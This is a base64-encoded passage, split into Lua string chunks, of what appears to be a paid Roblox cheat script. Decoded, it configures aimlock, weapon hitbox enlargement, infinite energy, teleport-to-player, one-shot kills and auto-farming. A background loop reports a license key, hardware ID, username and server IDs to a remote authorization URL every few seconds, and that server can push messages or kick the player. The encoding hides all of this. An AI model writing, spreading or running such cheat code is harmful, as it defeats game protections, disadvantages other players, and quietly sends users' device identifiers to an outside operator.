W5kZXIgPSBmYWxzZSwKICAgICAgICBXZWFwb25MZW5ndGggPSA0LAogICAgICAgIFdlYXBvbldpZHRoID0gNSwKICAgICAgICBXZWFwb25UcmFuc3BhcmVuY3kgPSAxLAogICAgICAgIFNpemVNdWx0aXBsaWVyRW5hYmxlZCA9IGZhbHNlLAogICAgICAgIFNpemVNdWx0aXBsaWVyID0gMSwKICAgICAgICAKICAgICAgICAtLSBIYW5kbGUgRXh0ZW5kZXIKICAgICAgICBIYW5kbGVFeHRlbmRlciA9IGZhbHNlLAogICAgICAgIEhhbmRsZVNpemUgPSA1LAogICAgICAgIAogICAgICAgIC0tIENvb2xkb3ducwogICAgICAgIE5vQ29vbGRvd24gPSBmYWxzZSwKICAgICAgICBJbmZpbml0ZUVuZXJneSA9IGZhbHNlLAogICAgICAgIE1heEVuZXJneVZhbHVlID0gMTAwLAogICAgICAgIAogICAgICAgIENvbWJhdEtleXMgPSB7CiAgICAgICAgICAgIEVudW0uS2V5Q29kZS5aLAogICAgICAgICAgICBFbnVtLktleUNvZGUuWCwK" .. "ICAgICAgICAgICAgRW51bS5LZXlDb2RlLkMsCiAgICAgICAgICAgIEVudW0uS2V5Q29kZS5SCiAgICAgICAgfSwKICAgICAgICAKICAgICAgICAtLSBBaW1sb2NrCiAgICAgICAgQWltbG9jayA9IGZhbHNlLAogICAgICAgIEFpbWxvY2tLZXkgPSBFbnVtLktleUNvZGUuVW5rbm93biwKICAgICAgICBBaW1sb2NrUGl4ZWwgPSBmYWxzZSwKICAgICAgICBBaW1sb2NrRHVyYXRpb24gPSAwLAogICAgICAgIE1vdXNlQ2xpY2tMb2NrID0gZmFsc2UsCiAgICAgICAgTW91c2VDbGlja0ZPViA9IDEwMCwKICAgICAgICBQaXhlbFggPSAxMDI1LAogICAgICAgIFBpeGVsWSA9IDk2NSwKICAgICAgICBQaXhlbENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSksCiAgICAgICAgCiAgICAgICAgLS0gVHJpZ2dlciBGbGFzaFN0ZXAKICAgICAgICBUcmlnZ2VyRmxhc2hTdGVwID0gZmFsc2UsCiAgICAgICAgVHJpZ2dlckZsYXNoU3RlcFVzZXIgPSAiIiwKICAgICAgICAKICAgICAgICAtLSBBaW0gRmlsdGVyCiAgICAgICAgQWltRmlsdGVyID0gZmFsc2UsCiAgICAgICAgQWltRmlsdGVyTW9kZSA9ICJXaGl0ZWxpc3QiLCAtLSBXaGl0ZWxpc3QgLyBCbGFja2xpc3QKICAgICAgICBBaW1GaWx0ZXJXaGl0ZWxpc3QgPSB7fSwKICAgICAgICBBaW1GaWx0ZXJCbGFja2xpc3QgPSB7fSwKICAgICAgICBBaW1GaWx0ZXJMaXN0ID0ge30sCiAgICAgICAgCiAgICAgICAgLS0gQ3Vyc29yIExvY2sKICAgICAgICBDdXJzb3JMb2NrID0gZmFsc2UsCiAgICAgICAgQ3Vyc29yTG9ja0tleSA9IEVudW0uS2V5Q29kZS5Vbmtub3duLAogICAgICAgIEN1cnNvckxvY2tEaXNhYmxlS2V5ID0gRW51bS5LZXlDb2RlLlVua25vd24sCiAgICAgICAgQ3Vyc29yTG9ja1VzZXIgPSAiIiwKICAgICAgICAKICAgICAgICAtLSBab25lIEFpbWxvY2sKICAgICAgICBab25lTG9jayA9IGZhbHNlLAogICAgICAgIFpvbmVLZXkgPSBFbnVtLktleUNvZGUuVW5rbm93biwKICAgICAgICBab25lRGlzdGFuY2UgPSAwLAogICAgICAgIFpvbmVEdXJhdGlvbiA9IDAsCiAgICAgICAgWm9uZUNvb2xkb3duID0gMCwKICAgICAgICAKICAgICAgICAtLSBBdXRvIFJhY2UKICAgICAgICBBdXRvVjMgPSBmYWxzZSwKICAgICAgICBBdXRvQXdha2VuaW5nID0gZmFsc2UsCiAgICAgICAgCiAgICAgICAgLS0gRGFzaAogICAgICAgIERhc2hMZW5ndGhFbmFibGVkID0gZmFsc2UsCiAgICAgICAgRGFzaExlbmd0aFZhbHVlID0gNTAsCiAgICAgICAgCiAgICAgICAgLS0gUmFpZAogICAgICAgIEF1dG9SYWlkID0gZmFsc2UsCiAgICAgICAgQXV0b1JhaWRLZXkgPSBFbnVtLktleUNvZGUuVW5rbm93biwKICAgICAgICBTZWxlY3RlZFJhaWQgPSAiRmxhbWUiLAogICAgICAgIAogICAgICAgIC0tIEF1dG8gTG9hZAogICAgICAgIEF1dG9Mb2FkQ29uZmlnID0gZmFsc2UsCiAgICAgICAgQXV0b0xvYWRDb25maWdOYW1lID0gIiIsCiAgICAgICAgCiAgICAgICAgLS0gU2hvcCAvIERldmlsIEZydWl0CiAgICAgICAgQXV0b0dhY2hhID0gZmFsc2UsCiAgICAgICAgQXV0b1N0b3JlRnJ1aXQgPSBmYWxzZSwKICAgICAgICBBdXRvR3JhYkZydWl0ID0gZmFsc2UsCiAgICAgICAgCiAgICAgICAgLS0gU2VhIEV2ZW50CiAgICAgICAgQXV0b0ZpbmRMZXZpYXRoYW4gPSBmYWxzZSwKICAgICAgICBBdXRvQnV5Qm9hdCA9IGZhbHNlLAogICAgICAgIFNlbGVjdGVkQm9hdCA9ICJTcGVlZGJvYXQiLAogICAgICAgIEpvaW5QbGF5ZXJOYW1lID0gIiIsCiAgICAgICAgSm9pbkpvYklEID0gIiIsCiAgICAgICAgQm90QXBpVXJsID0gQVVUSF9VUkwsCiAgICAgICAgRmFzdEF0dGFja1JhbmdlID0gMTAwMCwKICAgICAgICAKICAgICAgICAtLSBGYXJtCiAgICAgICAgRmFybU5lYXJlc3QgPSBmYWxzZSwKICAgICAgICBGYXJtS2V5ID0gRW51bS5LZXlDb2RlLlVua25vd24sCiAgICAgICAgQnJpbmdSYW5nZSA9IDI1MCwKICAgICAgICBCcmluZ01vYiA9IGZhbHNlLAogICAgICAgIEtpbGxEdW5nZW9uID0gZmFsc2UsCiAgICAgICAgRHVuZ2VvblJhbmdlID0gMCwKICAgICAgICAKICAgICAgICAtLSBUUCBQbGF5ZXIKICAgICAgICBUUFBsYXllcktleSA9IEVudW0uS2V5Q29kZS5Vbmtub3duLAogICAgICAgIFRQUGxheWVyUmFuZ2UgPSAxMDAwLAogICAgICAgIAogICAgICAgIC0tIE9uZSBTaG90CiAgICAgICAgT25lU2hvdEtleSA9IEVudW0uS2V5Q29kZS5Vbmtub3duLAogICAgICAgIAogICAgICAgIC0tIFBhbmljIE1vZGUKICAgICAgICBQYW5pY01vZGUgPSBmYWxzZSwKICAgICAgICBQYW5pY01vZGVLZXkgPSBFbnVtLktleUNvZGUuVW5rbm93biwKICAgICAgICBQYW5pY01vZGVIZWFsdGhFbmFibGUgPSBmYWxzZSwKICAgICAgICBQYW5pY01vZGVNaW5IZWFsdGggPSA0MDAwLAogICAgICAgIFBhbmljTW9kZU1heEhlYWx0aCA9IDkwMDAsCiAgICAgICAgCiAgICAgICAgLS0gVG9vbHMKICAgICAgICBUZWxlcG9ydFRvb2wgPSBmYWxzZSwKICAgICAgICAKICAgICAgICAtLSBTa2luIENoYW5nZXIKICAgICAgICBTa2luQ2hhbmdlcklEID0gIiIsCiAgICAgICAgCiAgICAgICAgLS0gVG9vbCBDb2xvciBDaGFuZ2VyCiAgICAgICAgVG9vbENvbG9yQ2hhbmdlciA9IGZhbHNlLAogICAgICAgIFRvb2xDb2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpLAogICAgICAgIAogICAgICAgIC0tIEVtb3RlIFBsYXllcgogICAgICAgIEVtb3RlSUQgPSAiIiwKICAgICAgICBFbW90ZUxvb3AgPSBmYWxzZSwKICAgICAgICBFbW90ZVNwZWVkID0gMSwKICAgICAgICBFbW90ZVBsYXlpbmcgPSBmYWxzZSwKICAgICAgICBFbW90ZUZyb3plbiA9IGZhbHNlLAogICAgICAgIAogICAgICAgIC0tIEVtb3RlIFBsYXllciBWYXJpYWJsZXMKICAgICAgICBFbW90ZUFuaW1hdGlvbiA9IG5pbCwKICAgICAgICBFbW90ZVRyYWNrID0gbmlsLAogICAgICAgIEVtb3RlQ29ubmVjdGlvbiA9IG5pbCwKICAgICAgICAKICAgICAgICAtLSBTbm93CiAgICAgICAgRGlzYWJsZVNub3cgPSBmYWxzZSwKICAgICAgICAKICAgICAgICAtLSBNYXN0ZXJ5IEZhcm0KICAgICAgICBNYXN0ZXJ5RmFybSA9IGZhbHNlLAogICAgICAgIEZhc3RNMSA9IGZhbHNlLAogICAgICAgIEN1c3RvbUZhcm1OZWFyZXN0ID0gZmFsc2UsCiAgICAgICAgU2VsZWN0V2VhcG9uVHlwZSA9ICJNZWxlZSIsCiAgICAgICAgU2VsZWN0ZWRXZWFwb24gPSBuaWwsCiAgICAgICAgQWx3YXlzRGF5ID0gZmFsc2UsCiAgICAgICAgQXV0b0VsaXRlaHVudGVyID0gZmFsc2UsCgogICAgICAgIC0tIEludGVybmFsCiAgICAgICAgUGFuaWNTcGVlZCA9IDAuMSwKICAgICAgICBTa3lIZWlnaHQgPSAxMDAwMDAwLAogICAgICAgIFRvcm5hZG9SYWRpdXMgPSAxNTAsCiAgICAgICAgVG9ybmFkb1NwZWVkID0gMTUsCiAgICAgICAgSGlkZUd1aUtleSA9IEVudW0uS2V5Q29kZS5MZWZ0U2hpZnQKICAgIH0KICAgIAogICAgbG9jYWwgb3JpZ2luYWxXZWFwb25TaXplcyA9IHt9CiAgICBsb2NhbCBvcmlnaW5hbEhhbmRTaXplcyA9IHt9CgogICAgbG9jYWwgZnVuY3Rpb24gU2V0dXBBdXRvTG9hZCgpCiAgICAgICAgLS0gRmVhdHVyZSByZW1vdmVkCiAgICBlbmQKICAgIAogICAgbG9jYWwgZnVuY3Rpb24gVXBkYXRlTG9hZGVyU2V0dGluZ3MoKQogICAgICAgIGlmIHdyaXRlZmlsZSB0aGVuCiAgICAgICAgICAgIGxvY2FsIGRhdGEgPSB7CiAgICAgICAgICAgICAgICBFbmFibGVkID0gQ29uZmlnLkF1dG9Mb2FkQ29uZmlnLAogICAgICAgICAgICAgICAgQ29uZmlnTmFtZSA9IENvbmZpZy5BdXRvTG9hZENvbmZpZ05hbWUsCiAgICAgICAgICAgICAgICBEaXNhYmxlU25vdyA9IENvbmZpZy5EaXNhYmxlU25vdwogICAgICAgICAgICB9CiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgd3JpdGVmaWxlKCJDeWJlcnB1bmtzX0xvYWRlci5qc29uIiwgSHR0cFNlcnZpY2U6SlNPTkVuY29kZShkYXRhKSkgZW5kKQogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIC0tID09PSBCUk9BRENBU1QgU1lTVEVNID09PQogICAgbG9jYWwgQnJvYWRjYXN0R3VpID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQogICAgQnJvYWRjYXN0R3VpLk5hbWUgPSAiQ3liZXJwdW5rc0Jyb2FkY2FzdCIKICAgIEJyb2FkY2FzdEd1aS5JZ25vcmVHdWlJbnNldCA9IHRydWUKICAgIHBjYWxsKGZ1bmN0aW9uKCkgQnJvYWRjYXN0R3VpLlBhcmVudCA9IENvcmVHdWkgZW5kKQogICAgaWYgbm90IEJyb2FkY2FzdEd1aS5QYXJlbnQgdGhlbiBCcm9hZGNhc3RHdWkuUGFyZW50ID0gcGxheWVyOldhaXRGb3JDaGlsZCgiUGxheWVyR3VpIikgZW5kCiAgICAKICAgIGxvY2FsIEJyb2FkY2FzdExhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgQnJvYWRjYXN0TGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCA2MCkKICAgIEJyb2FkY2FzdExhYmVsLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAuMSwgMCkKICAgIEJyb2FkY2FzdExhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBCcm9hZGNhc3RMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKQogICAgQnJvYWRjYXN0TGFiZWwuVGV4dFN0cm9rZVRyYW5zcGFyZW5jeSA9IDAKICAgIEJyb2FkY2FzdExhYmVsLlRleHRTdHJva2VDb2xvcjMgPSBDb2xvcjMubmV3KDAsMCwwKQogICAgQnJvYWRjYXN0TGFiZWwuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1CbGFjawogICAgQnJvYWRjYXN0TGFiZWwuVGV4dFNpemUgPSAzNQogICAgQnJvYWRjYXN0TGFiZWwuVGV4dCA9ICIiCiAgICBCcm9hZGNhc3RMYWJlbC5WaXNpYmxlID0gZmFsc2UKICAgIEJyb2FkY2FzdExhYmVsLlBhcmVudCA9IEJyb2FkY2FzdEd1aQoKICAgIC0tID09PSBTRVJWRVIgU0VDVVJJVFkgQ0hFQ0sgPT09CiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSBDb25maWcuSXNSdW5uaW5nIGRvCiAgICAgICAgICAgIHRhc2sud2FpdCgzKSAtLSBDaGVjayBzdGF0dXMgZXZlcnkgM3MKICAgICAgICAgICAgaWYga2V5U3RyaW5nIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHJlcXVlc3RGdW5jID0gKHN5biBhbmQgc3luLnJlcXVlc3QpIG9yIChodHRwIGFuZCBodHRwLnJlcXVlc3QpIG9yIGh0dHBfcmVxdWVzdCBvciAoZmx1eHVzIGFuZCBmbHV4dXMucmVxdWVzdCkgb3IgcmVxdWVzdAogICAgICAgICAgICAgICAgaWYgcmVxdWVzdEZ1bmMgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGh3aWQgPSAoZ2V0aHdpZCBhbmQgZ2V0aHdpZCgpKSBvciAoZ2V0X2h3aWQgYW5kIGdldF9od2lkKCkpIG9yIHBsYXllci5Vc2VySWQKICAgICAgICAgICAgICAgICAgICBsb2NhbCBzdWNjZXNzLCByZXNwb25zZSA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJlcXVlc3RGdW5jKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFVybCA9IEFVVEhfVVJMIC4uICIvdmVyaWZ5P2tleT0iIC4uIGtleVN0cmluZyAuLiAiJmh3aWQ9IiAuLiB0b3N0cmluZyhod2lkKSAuLiAiJnR5cGU9aGVhcnRiZWF0JnVzZXJuYW1lPSIgLi4gSHR0cFNlcnZpY2U6VXJsRW5jb2RlKHBsYXllci5OYW1lKSAuLiAiJmpvYmlkPSIgLi4gdG9zdHJpbmcoZ2FtZS5Kb2JJZCkgLi4gIiZwbGFjZWlkPSIgLi4gdG9zdHJpbmcoZ2FtZS5QbGFjZUlkKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE1ldGhvZCA9ICJHRVQiCiAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgIGlmIHN1Y2Nlc3MgYW5kIHJlc3BvbnNlIGFuZCByZXNwb25zZS5TdGF0dXNDb2RlID09IDIwMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGlzSnNvbiwgZGF0YSA9IHBjYWxsKGZ1bmN0aW9uKCkgcmV0dXJuIEh0dHBTZXJ2aWNlOkpTT05EZWNvZGUocmVzcG9uc2UuQm9keSkgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBpc0pzb24gYW5kIGRhdGEgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gVXBkYXRlIFdoaXRlbGlzdCBTdGF0dXMKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRhdGEud2hpdGVsaXN0ZWQgfj0gbmlsIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb25maWcuSXNXaGl0ZWxpc3RlZCA9IGRhdGEud2hpdGVsaXN0ZWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gVXBkYXRlIEFkbWluIFN0YXR1cwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZGF0YS5hZG1pbiB+PSBuaWwgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZy5Jc0FkbWluID0gZGF0YS5hZG1pbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLSBCcm9hZGNhc3QgTWVzc2FnZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZGF0YS5icm9hZGNhc3QgYW5kIGRhdGEuYnJvYWRjYXN0IH49ICIiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCcm9hZGNhc3RMYWJlbC5UZXh0ID0gZGF0YS5icm9hZGNhc3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCcm9hZGNhc3RMYWJlbC5WaXNpYmxlID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJyb2FkY2FzdExhYmVsLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgbW9kTXNnID0gZGF0YS5tZXNzYWdlIGFuZCAoIlxuTW9kZXJhdG9yIE1lc3NhZ2U6ICIgLi4gZGF0YS5tZXNzYWdlKSBvciAiIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZGF0YS5zdGF0dXMgPT0gInBhdXNlZCIgdGhlbiBwbGF5ZXI6S2ljaygiWW91ciBrZXkgaGFzIGJlZW4gc3RvcCIgLi4gbW9kTXNnKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRhdGEuc3RhdHVzID09ICJiYW5uZWQiIHRoZW4gcGxheWVyOktpY2soIllvdXIga2V5IGhhcyBiZWVuIGRlbGV0ZWQiIC4uIG1vZE1zZykgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkYXRhLnN0YXR1cyA9PSAia2lja2VkIiB0aGVuIHBsYXllcjpLaWNrKCJZb3UgaGF2ZSBiZWVuIGtpY2tlZCIgLi4gbW9kTXNnKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRhdGEuc3RhdHVzID09ICJpbnZhbGlkIiB0aGVuIHBsYXllcjpLaWNrKCJZb3VyIGtleSBoYXMgYmVlbiBkZWxldGVkIikgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkYXRhLnN0YXR1cyA9PSAiZXhwaXJlZCIgdGhlbiBwbGF5ZXI6S2ljaygiS2V5IEV4cGlyZWQiKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRhdGEuc3RhdHVzID09ICJod2lkX21pc21hdGNoIiB0aGVuIHBsYXllcjpLaWNrKCJUaGlzIGlzIG5vdCB5b3VyIGtleSwgYnV5IG9uZSBpbiB0aGUgZGlzY29yZCBzZXJ2ZXIiKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRhdGEuc3RhdHVzID09ICJtYWludGVuYW5jZSIgdGhlbiAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLSBLaWNrIHVzZXIgZnJvbSBnYW1lIHdoZW4gc2NyaXB0IGlzIGFscmVhZHkgcnVubmluZwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllcjpLaWNrKCJTZXJ2ZXJzIGFyZSB1bmRlciBtYWludGVuYW5jZSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCgogICAgLS0gPT09IFdFQVBPTiBFWFRFTkRFUiAvIFNLSU4gR0xJVENIIEZVTkNUSU9OUyAoTW92ZWQgVXApID09PQogICAgbG9jYWwgZnVuY3Rpb24gU2V0V2VhcG9uU2l6ZShtdWx0aXBsaWVyKQogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIKICAgICAgICBpZiBub3QgY2hhcmFjdGVyIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIAogICAgICAgIGZvciBfLCB0b29sIGluIHBhaXJzKGNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGhhbmRsZSA9IHRvb2w6RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSIpCiAgICAgICAgICAgICAgICBpZiBoYW5kbGUgYW5kIGhhbmRsZTpJc0EoIkJhc2VQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGNvbXBlbnNhdGlvbk11bHRpcGxpZXIgPSBtdWx0aXBsaWVyCiAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLlNpemVNdWx0aXBsaWVyRW5hYmxlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbXBlbnNhdGlvbk11bHRpcGxpZXIgPSBtdWx0aXBsaWVyICogQ29uZmlnLlNpemVNdWx0aXBsaWVyCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IG9yaWdpbmFsV2VhcG9uU2l6ZXNbdG9vbC5OYW1lXSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIG9yaWdpbmFsV2VhcG9uU2l6ZXNbdG9vbC5OYW1lXSA9IHt9CiAgICAgICAgICAgICAgICAgICAgICAgIG9yaWdpbmFsV2VhcG9uU2l6ZXNbdG9vbC5OYW1lXS5IYW5kbGVTaXplID0gaGFuZGxlLlNpemUKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBoYW5kbGUuU2l6ZSA9IG9yaWdpbmFsV2VhcG9uU2l6ZXNbdG9vbC5OYW1lXS5IYW5kbGVTaXplICogY29tcGVuc2F0aW9uTXVsdGlwbGllcgogICAgICAgICAgICAgICAgICAgIGhhbmRsZS5DYW5Db2xsaWRlID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBoYW5kbGUuTWFzc2xlc3MgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgaGFuZGxlLlRyYW5zcGFyZW5jeSA9IENvbmZpZy5XZWFwb25UcmFuc3BhcmVuY3kKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBmb3IgXywgcGFydCBpbiBwYWlycyh0b29sOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBwYXJ0OklzQSgiQmFzZVBhcnQiKSBhbmQgcGFydCB+PSBoYW5kbGUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgY29tcGVuc2F0aW9uTXVsdGlwbGllciA9IG11bHRpcGxpZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5TaXplTXVsdGlwbGllckVuYWJsZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbXBlbnNhdGlvbk11bHRpcGxpZXIgPSBtdWx0aXBsaWVyICogQ29uZmlnLlNpemVNdWx0aXBsaWVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IG9yaWdpbmFsV2VhcG9uU2l6ZXNbdG9vbC5OYW1lXVtwYXJ0Lk5hbWVdIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcmlnaW5hbFdlYXBvblNpemVzW3Rvb2wuTmFtZV1bcGFydC5OYW1lXSA9IHBhcnQuU2l6ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJ0LlNpemUgPSBvcmlnaW5hbFdlYXBvblNpemVzW3Rvb2wuTmFtZV1bcGFydC5OYW1lXSAqIGNvbXBlbnNhdGlvbk11bHRpcGxpZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnQuQ2FuQ29sbGlkZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJ0Lk1hc3NsZXNzID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFydC5UcmFuc3BhcmVuY3kgPSBDb25maWcuV2VhcG9uVHJhbnNwYXJlbmN5CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHBhcnQ6SXNBKCJBdHRhY2htZW50IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgY29tcGVuc2F0aW9uTXVsdGlwbGllciA9IG11bHRpcGxpZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5TaXplTXVsdGlwbGllckVuYWJsZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbXBlbnNhdGlvbk11bHRpcGxpZXIgPSBtdWx0aXBsaWVyICogQ29uZmlnLlNpemVNdWx0aXBsaWVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IG9yaWdpbmFsV2VhcG9uU2l6ZXNbdG9vbC5OYW1lXVtwYXJ0Lk5hbWUgLi4gIl9Qb3MiXSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3JpZ2luYWxXZWFwb25TaXplc1t0b29sLk5hbWVdW3BhcnQuTmFtZSAuLiAiX1BvcyJdID0gcGFydC5Qb3NpdGlvbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJ0LlBvc2l0aW9uID0gb3JpZ2luYWxXZWFwb25TaXplc1t0b29sLk5hbWVdW3BhcnQuTmFtZSAuLiAiX1BvcyJdICogY29tcGVuc2F0aW9uTXVsdGlwbGllcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiBwYXJ0OklzQSgiU3BlY2lhbE1lc2giKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBjb21wZW5zYXRpb25NdWx0aXBsaWVyID0gbXVsdGlwbGllcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLlNpemVNdWx0aXBsaWVyRW5hYmxlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tcGVuc2F0aW9uTXVsdGlwbGllciA9IG11bHRpcGxpZXIgKiBDb25maWcuU2l6ZU11bHRpcGxpZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3JpZ2luYWxXZWFwb25TaXplc1t0b29sLk5hbWVdW3BhcnQuTmFtZSAuLiAiX1NjYWxlIl0gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9yaWdpbmFsV2VhcG9uU2l6ZXNbdG9vbC5OYW1lXVtwYXJ0Lk5hbWUgLi4gIl9TY2FsZSJdID0gcGFydC5TY2FsZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJ0LlNjYWxlID0gb3JpZ2luYWxXZWFwb25TaXplc1t0b29sLk5hbWVdW3BhcnQuTmFtZSAuLiAiX1NjYWxlIl0gKiBjb21wZW5zYXRpb25NdWx0aXBsaWVyCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgLS0gRW5sYXJnZSBoYW5kcwogICAgICAgIGxvY2FsIGxlZnRIYW5kID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpIG9yIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiTGVmdCBBcm0iKSBvciBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkxlZnRBcm0iKQogICAgICAgIGxvY2FsIHJpZ2h0SGFuZCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUmlnaHRIYW5kIikgb3IgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJSaWdodCBBcm0iKSBvciBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlJpZ2h0QXJtIikKICAgICAgICBpZiBsZWZ0SGFuZCBhbmQgbGVmdEhhbmQ6SXNBKCJCYXNlUGFydCIpIHRoZW4KICAgICAgICAgICAgaWYgbm90IG9yaWdpbmFsSGFuZFNpemVzWyJMZWZ0Il0gdGhlb